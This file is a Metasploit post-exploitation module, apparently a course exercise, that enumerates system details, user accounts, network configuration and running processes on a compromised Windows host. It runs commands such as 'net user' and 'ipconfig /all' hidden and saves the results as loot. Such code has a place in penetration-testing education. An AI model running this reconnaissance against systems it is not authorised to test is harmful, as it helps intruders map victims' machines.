##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Information Gathering',
      'Description'    => %q{
        This post-exploitation module gathers various pieces of information from a
        target Windows system once access is gained. It collects OS version, user accounts,
        network configuration, and running processes. The information is output in a
        structured format for analysis and documentation.
      },
      'Author'         => ['Holberton School'],
      'License'        => MSF_LICENSE,
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter', 'shell']
    ))

    register_options(
      [
        OptInt.new('SESSION', [true, 'The session to run this module on'])
      ])
  end

  def run
    # Retrieve session
    session_id = datastore['SESSION']

    print_status("Gathering system information from #{session.session_host}")

    begin
      # Gather system information
      gather_system_info

      # Gather user information
      gather_user_info

      # Gather network information
      gather_network_info

      # Gather running processes
      gather_running_processes

      print_good("Information gathering completed successfully")

    rescue ::Exception => e
      print_error("Error during information gathering: #{e.class} - #{e.message}")
    end
  end

  def gather_system_info
    print_status("Collecting system information...")

    begin
      # Get system information
      sysinfo = session.sys.config.sysinfo

      os = sysinfo['OS']
      computer = sysinfo['Computer']
      arch = sysinfo['Architecture']

      print_status("OS: #{os}")
      print_status("Computer: #{computer}")

      # Report to database
      report_host(
        host: session.session_host,
        os_name: os,
        os_flavor: computer
      )

      # Store in loot
      store_loot(
        'system.info',
        'text/plain',
        session.session_host,
        "OS: #{os}\nComputer: #{computer}\nArchitecture: #{arch}",
        'system_info.txt',
        'System Information'
      )

    rescue ::Exception => e
      print_error("Failed to gather system info: #{e.message}")
    end
  end

  def gather_user_info
    print_status("Collecting user information...")

    begin
      # Get current user
      user = session.sys.config.getuid

      print_status("User: #{user}")

      # Check if running as SYSTEM
      if is_system?
        print_good("Running with SYSTEM privileges")
      elsif is_admin?
        print_good("Running with Administrator privileges")
      else
        print_status("Running with standard user privileges")
      end

      # Try to enumerate local users
      users_info = ""

      begin
        # Get list of local users (if we have privileges)
        users_cmd = cmd_exec('net user')

        if users_cmd && !users_cmd.empty?
          print_status("Local user accounts enumerated")
          users_info = users_cmd
        end
      rescue ::Exception => e
        vprint_error("Could not enumerate users: #{e.message}")
      end

      # Store in loot
      store_loot(
        'user.info',
        'text/plain',
        session.session_host,
        "Current User: #{user}\n\nLocal Users:\n#{users_info}",
        'user_info.txt',
        'User Information'
      )

    rescue ::Exception => e
      print_error("Failed to gather user info: #{e.message}")
    end
  end

  def gather_network_info
    print_status("Collecting network information...")

    begin
      # Get network interfaces
      interfaces = session.net.config.interfaces

      network_info = ""

      interfaces.each do |iface|
        iface_name = iface.pretty || iface.mac_name || "Unknown"

        print_status("Interface: #{iface_name}")
        network_info << "Interface: #{iface_name}\n"

        # Get IPv4 addresses
        if iface.addrs && !iface.addrs.empty?
          iface.addrs.each do |addr|
            if addr =~ /^\d+\.\d+\.\d+\.\d+$/  # IPv4 check
              print_status("  IP: #{addr}")
              network_info << "  IP: #{addr}\n"

              # Get netmask if available
              if iface.netmasks && !iface.netmasks.empty?
                iface.netmasks.each do |netmask|
                  if netmask =~ /^\d+\.\d+\.\d+\.\d+$/
                    print_status("  Netmask: #{netmask}")
                    network_info << "  Netmask: #{netmask}\n"
                  end
                end
              end
            end
          end
        end

        network_info << "\n"
      end

      # Get routing table
      begin
        routes_cmd = cmd_exec('route print')
        if routes_cmd && !routes_cmd.empty?
          network_info << "\nRouting Table:\n#{routes_cmd}\n"
        end
      rescue ::Exception => e
        vprint_error("Could not get routing table: #{e.message}")
      end

      # Get DNS configuration
      begin
        dns_cmd = cmd_exec('ipconfig /all')
        if dns_cmd && !dns_cmd.empty?
          network_info << "\nDNS Configuration:\n#{dns_cmd}\n"
        end
      rescue ::Exception => e
        vprint_error("Could not get DNS configuration: #{e.message}")
      end

      # Store in loot
      store_loot(
        'network.config',
        'text/plain',
        session.session_host,
        network_info,
        'network_info.txt',
        'Network Configuration'
      )

    rescue ::Exception => e
      print_error("Failed to gather network info: #{e.message}")
    end
  end

  def gather_running_processes
    print_status("Collecting running processes...")

    begin
      # Get process list
      processes = session.sys.process.get_processes

      processes_info = "PID\tName\tPath\tUser\n"
      processes_info << "=" * 80 + "\n"

      processes.each do |proc|
        pid = proc['pid']
        name = proc['name']
        path = proc['path'] || 'N/A'
        user = proc['user'] || 'N/A'

        print_status("Process #{pid} - #{name}")
        processes_info << "#{pid}\t#{name}\t#{path}\t#{user}\n"
      end

      # Store in loot
      store_loot(
        'processes.list',
        'text/plain',
        session.session_host,
        processes_info,
        'processes.txt',
        'Running Processes'
      )

      print_status("Total processes: #{processes.length}")

    rescue ::Exception => e
      print_error("Failed to gather process info: #{e.message}")
    end
  end

  # Helper method to execute commands (for shell sessions)
  def cmd_exec(cmd, timeout = 15)
    if session.type == "meterpreter"
      return session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true}).channel.read
    else
      return session.shell_command_token(cmd, timeout)
    end
  rescue ::Exception => e
    vprint_error("Command execution failed: #{e.message}")
    return nil
  end
end
